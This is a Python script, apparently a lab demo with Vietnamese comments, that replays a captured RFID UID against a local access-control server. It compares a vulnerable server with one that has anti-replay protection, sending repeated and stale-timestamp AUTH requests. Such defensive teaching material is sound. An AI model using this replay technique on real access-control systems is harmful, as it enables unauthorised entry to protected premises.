#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Replay Attack Tool - Send captured RFID UID back to Access Control Server
Demonstrates vulnerability when server has no anti-replay protection.

Usage:
    python replay_attack.py              # Tấn công AC thường (port 7001) — VULNERABLE
    python replay_attack.py --secure     # Tấn công Secure AC (port 7002) — BLOCKED
"""

import socket, json, time, sys, io
from datetime import datetime
from colorama import Fore, init
init(autoreset=True)

# Fix Windows CP1252 encoding issue
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# Chọn port theo argument
SECURE_MODE = '--secure' in sys.argv
AC_HOST = '127.0.0.1'
AC_PORT = 7002 if SECURE_MODE else 7001

STOLEN_UID = 'A1B2C3D4E5'   # UID captured from eavesdropper


class ReplayAttack:
    """Replay attack tool"""

    def __init__(self):
        self.captured_frames = []
        self.replay_count = 0

    def capture_frame(self, frame_data: dict):
        """Capture a frame for later replay"""
        self.captured_frames.append(frame_data)
        print(f"{Fore.YELLOW}[+] Frame captured for replay: {frame_data}")

    def replay_frame(self, frame_index: int) -> dict:
        """Replay a captured frame"""
        if 0 <= frame_index < len(self.captured_frames):
            frame = self.captured_frames[frame_index].copy()
            frame["replayed_at"] = datetime.now().isoformat()
            self.replay_count += 1
            print(f"{Fore.RED}[+] Frame replayed: {frame}")
            return frame
        return None

    def replay_all_frames(self) -> list:
        """Replay all captured frames"""
        replayed = []
        for i in range(len(self.captured_frames)):
            replayed.append(self.replay_frame(i))
        return replayed

    def get_replay_count(self) -> int:
        """Get total number of replays"""
        return self.replay_count


def send_auth(uid: str, timestamp: float) -> dict:
    """Gửi yêu cầu xác thực tới AC server"""
    s = socket.socket()
    s.settimeout(2)
    s.connect((AC_HOST, AC_PORT))
    s.send(json.dumps({'cmd': 'AUTH', 'uid': uid, 'timestamp': timestamp}).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp


if __name__ == "__main__":
    mode_label = f"SECURE AC (port {AC_PORT}) - Defense ON" if SECURE_MODE else f"AC Server (port {AC_PORT}) - No Defense"
    print(f"{Fore.RED}=== RFID Replay Attack ===")
    print(f"{Fore.CYAN}Target: {mode_label}\n")

    # Step 1: Simulate frame capture from eavesdropper
    replay = ReplayAttack()
    replay.capture_frame({"uid": STOLEN_UID, "command": "AUTH"})

    # Step 2: Attempt 1 - fresh timestamp (legitimate first auth)
    ts = time.time()
    print(f"{Fore.YELLOW}[*] Attempt 1 - fresh timestamp ({ts:.1f})...")
    try:
        resp1 = send_auth(STOLEN_UID, ts)
        color = Fore.GREEN if resp1.get('status') == 'GRANTED' else Fore.RED
        print(f"{color}[Attempt 1] -> {resp1.get('status')} {resp1.get('owner','')}")
    except Exception as e:
        print(f"{Fore.RED}[Attempt 1] Connection failed: {e}")
        sys.exit(1)

    # Step 3: Attempt 2 - REPLAY same timestamp (attacker replays)
    print(f"\n{Fore.RED}[*] REPLAY: Resend AUTH with SAME timestamp ({ts:.1f})...")
    try:
        resp2 = send_auth(STOLEN_UID, ts)
        color = Fore.GREEN if resp2.get('status') == 'GRANTED' else Fore.RED
        icon = '[!] ATTACK SUCCEEDED' if resp2.get('status') == 'GRANTED' else '[OK] BLOCKED'
        print(f"{color}[Attempt 2 - Replay] -> {resp2.get('status')} - {resp2.get('msg', resp2.get('owner', ''))} {icon}")
    except Exception as e:
        print(f"{Fore.RED}[Attempt 2] Connection failed: {e}")

    # Step 4: Attempt 3 - old timestamp (100s ago)
    old_ts = time.time() - 100
    print(f"\n{Fore.RED}[*] REPLAY with OLD timestamp (100s ago: {old_ts:.1f})...")
    try:
        resp3 = send_auth(STOLEN_UID, old_ts)
        color = Fore.GREEN if resp3.get('status') == 'GRANTED' else Fore.RED
        icon = '[!] ATTACK SUCCEEDED' if resp3.get('status') == 'GRANTED' else '[OK] BLOCKED'
        print(f"{color}[Attempt 3 - Old TS] -> {resp3.get('status')} - {resp3.get('msg', resp3.get('owner', ''))} {icon}")
    except Exception as e:
        print(f"{Fore.RED}[Attempt 3] Connection failed: {e}")

    print(f"\n{Fore.CYAN}Total replays attempted: {replay.get_replay_count()}")

